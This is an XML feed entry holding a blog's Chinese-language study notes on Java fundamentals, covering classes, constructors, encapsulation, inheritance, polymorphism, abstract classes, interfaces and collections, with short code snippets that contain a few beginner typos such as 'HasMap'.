    <content type="html"><![CDATA[<br /><hr><h1 id="Less-is-More"><a href="#Less-is-More" class="headerlink" title="Less is More"></a>Less is More</h1><br /><hr><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="1-MVC架构设计模式"><a href="#1-MVC架构设计模式" class="headerlink" title="1.MVC架构设计模式"></a>1.MVC架构设计模式</h3><p>M<sub>数据模型层</sub></p><p>V<sub>视图层</sub></p><p>C<sub>控制器层</sub></p><hr><h2 id="第二章-类和对象"><a href="#第二章-类和对象" class="headerlink" title="第二章 类和对象"></a>第二章 类和对象</h2><h3 id="1-面向对象概念："><a href="#1-面向对象概念：" class="headerlink" title="1. 面向对象概念："></a>1. 面向对象概念：</h3><h3 id="2-类的创建"><a href="#2-类的创建" class="headerlink" title="2. 类的创建"></a>2. 类的创建</h3><pre><code class="java">语法：public class 类名{}File---&gt;new---&gt;class---&gt;类名</code></pre><h3 id="3-创建对象"><a href="#3-创建对象" class="headerlink" title="3.创建对象"></a>3.创建对象</h3><pre><code class="java">类名 对象名=new 类名();对象名.方法名(); 对象名.属性</code></pre><h3 id="4-构造方法："><a href="#4-构造方法：" class="headerlink" title="4.构造方法："></a>4.构造方法：</h3><h4 id="方法名和类名相同-没有返回值"><a href="#方法名和类名相同-没有返回值" class="headerlink" title="方法名和类名相同,没有返回值"></a>方法名和类名相同,没有返回值</h4><pre><code class="java">public class 类名{    public 类名(){}//主要的做用是初始化操作}</code></pre><h3 id="5-构造方法重载"><a href="#5-构造方法重载" class="headerlink" title="5.构造方法重载"></a>5.构造方法重载</h3><h5 id="在同一个类中，方法名相同，参数个数，顺序，类型不相同的构造方法"><a href="#在同一个类中，方法名相同，参数个数，顺序，类型不相同的构造方法" class="headerlink" title="在同一个类中，方法名相同，参数个数，顺序，类型不相同的构造方法"></a>在同一个类中，方法名相同，参数个数，顺序，类型不相同的构造方法</h5><pre><code class="java">public class 类名{    public 类名(){    }    public 类名(String name,int age){    }}</code></pre><h3 id="6-构造方法的执行"><a href="#6-构造方法的执行" class="headerlink" title="6.构造方法的执行"></a>6.构造方法的执行</h3><pre><code class="java">new 类名();---&gt;执行构造方法super();---&gt;执行了父类的构造方法</code></pre><pre><code>###     7.static静态修饰符</code></pre><h5 id="静态修饰符可以修饰属性，方法，代码块"><a href="#静态修饰符可以修饰属性，方法，代码块" class="headerlink" title="静态修饰符可以修饰属性，方法，代码块"></a>静态修饰符可以修饰属性，方法，代码块</h5><pre><code class="java">类名.属性类名.方法名</code></pre><h3 id="8-java内存"><a href="#8-java内存" class="headerlink" title="8.java内存"></a>8.java内存</h3><h3 id="（栈和堆，static，方法区，GC（垃圾回收机制））"><a href="#（栈和堆，static，方法区，GC（垃圾回收机制））" class="headerlink" title="（栈和堆，static，方法区，GC（垃圾回收机制））"></a>（栈和堆，static，方法区，GC（垃圾回收机制））</h3><hr><h2 id="第三章-面向对象三大特征—封装"><a href="#第三章-面向对象三大特征—封装" class="headerlink" title="第三章 面向对象三大特征—封装"></a>第三章 面向对象三大特征—封装</h2><ul><li><p>封装的概念</p></li><li><p>封装的步骤</p><ul><li>把属性私有化（private）</li><li>对这些属性设置get和set方法</li><li>调用处理这些方法</li></ul></li><li><p>封装的作用：避免一些用一些不合乎常理的操作</p></li><li><p>修饰符</p><ul><li><p><strong>public—&gt;公共的：</strong>在一个项目中都可以访问，权限最高</p></li><li><p><strong>private—&gt;私有的：</strong>只能在本类中进行访问，权限最低</p></li><li><p><strong>protected—&gt;安全的，受保护的：</strong>同一个包能进行访问，继承中之类可以访问父类</p></li><li><p><strong>default—&gt;默认的：</strong>同一个包能访问</p><table><thead><tr><th align="center">修饰符</th><th align="center">同一个类</th><th align="center">同一个包</th><th align="center">子类</th><th>所有类</th></tr></thead><tbody><tr><td align="center">private(私有的)</td><td align="center">*</td><td align="center"></td><td align="center"></td><td></td></tr><tr><td align="center">default(常规)</td><td align="center">*</td><td align="center">*</td><td align="center"></td><td></td></tr><tr><td align="center">protected(受保护的)</td><td align="center">*</td><td align="center">*</td><td align="center">*</td><td></td></tr><tr><td align="center">public(公共的)</td><td align="center">*</td><td align="center">*</td><td align="center">*</td><td>*</td></tr></tbody></table><h6 id="从小到大优先级"><a href="#从小到大优先级" class="headerlink" title="从小到大优先级:"></a><code>从小到大优先级:</code></h6><p><code>private &lt; default &lt; protected &lt; public</code></p></li></ul></li></ul><hr><h2 id="第四章-面向对象三大特征—继承"><a href="#第四章-面向对象三大特征—继承" class="headerlink" title="第四章 面向对象三大特征—继承"></a>第四章 面向对象三大特征—继承</h2><ol><li>继承的概念：<code>父亲儿子，电影《西虹市首富》</code></li></ol><ol start="2"><li><p>.继承的关键字：<code>extends</code></p></li><li><p>继承的语法：<code>public class 类名  extends 父类{}</code></p></li><li><p>使用，在之类中：</p></li></ol><pre><code>   可以直接调用父类的非私有属性和方法   可以用super.方法   super.属性</code></pre><ol start="5"><li><p>父类构造方法调用：super();</p><pre><code>调用父类的构造方法必须在之类中调用必须实在之类构造方法的第一行代码</code></pre></li></ol><ol start="6"><li><p>重写@Override</p><pre><code>必须继承方法名一致，参数个数，顺序，类型全部一致</code></pre><hr><h2 id="第五章-面向对象（多态）"><a href="#第五章-面向对象（多态）" class="headerlink" title="第五章 面向对象（多态）"></a>第五章 面向对象（多态）</h2><ul><li><p>多态的概念</p></li><li><p>多态的必要条件</p><ul><li>继承</li><li>重写</li><li>父类引用指向子类对象（向上转型）</li></ul></li><li><p>多态的使用</p><ul><li><pre><code class="java">public class Father{  public void cooking(){                 System.out.println(&quot;米饭&quot;);             }         }      public class Son extends Father{             @Override             public void cooking(){                 System.out.println(&quot;熬粥&quot;);             }         }         public class Test {            public static void main(String[] args) {                Father son=new Son();                son.cooking();            }}</code></pre></li></ul></li><li><p>向下转型</p><ul><li><code>Son son=(Son)father;</code></li></ul></li></ul><hr><h2 id="第六章-抽象"><a href="#第六章-抽象" class="headerlink" title="第六章 抽象"></a>第六章 抽象</h2><ol><li><p>抽象的概念</p></li><li><p>抽象的关键字<br>  <code>abstract</code> <code>可以修饰类，可以修饰方法</code></p></li><li><p>抽象的用法 </p><pre><code class="java">  //抽象类  public abstract class 类名{      //抽象方法没有方法体      public abstract void 方法名();      }  //当父类是抽象类的时候，子类必须重写父类里面的抽象方法</code></pre></li><li><p>final修饰符：最终的<br>  <code>修饰变量，修饰方法，修饰类</code></p><pre><code class="tex">  1.当修饰变量时，变量转换成常量，常量的值不能改变    final int a=18;//a=18;不能改变,必须给一个初始值  2.当修饰方法时，该方法不能被重写  3.当修饰类时，该类不能被继承</code></pre><hr><h2 id="第七章-接口"><a href="#第七章-接口" class="headerlink" title="第七章 接口"></a>第七章 接口</h2><ol><li><p>接口的概念</p></li><li><p>接口的关键字<br><code>interface</code></p></li><li><p>接口的语法<br><code>File---&gt;new---&gt;interface//创建接口</code></p><pre><code class="java">public interface 接口名{}</code></pre></li><li><p>接口的用法<br><code>实现接口的关键字  implements</code></p><pre><code class="java">public interface 接口名{    //接口是纯抽象类    //接口里面的方法都是抽象方法    void setData();}public class Play implements 接口名{@Overridevoid setData(){    } }public class Test {    public static void main(String[] args) {        Play play=new Play();        play.setData();    }}</code></pre><p><em>注意接口可以进行多继承</em></p><p><code>public interface 接口名 extends 接口名，接口名{}</code></p><p>一般用法</p><p><code>public class 类名 extends 父类 implements 接口，接口{}</code></p></li></ol></li></ol></li></ol><hr><h2 id="第八章-集合框架"><a href="#第八章-集合框架" class="headerlink" title="第八章 集合框架"></a>第八章 集合框架</h2><ol><li><p>ArrayList</p><pre><code class="java">用法:ArrayList list=new ArrayList();list.add();//添加数据list.get();//获取数据</code></pre></li></ol><ol start="2"><li><p>Map</p><pre><code class="java">用法Map map=new HasMap();map.put(key,value);//key不能重复map.get(key);//获取key对象的value</code></pre></li></ol><ol start="3"><li><p>泛型</p><pre><code class="java">ArrayList&lt;String&gt; list=new ArrayList&gt;&lt;String&gt;();Map&lt;String,String&gt; map=new HasMap&lt;String,String&gt;();ArrayList&lt;Map&lt;String,String&gt;&gt; list=new ArrayList&gt;&lt;Map&lt;String,String&gt;&gt;();</code></pre></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>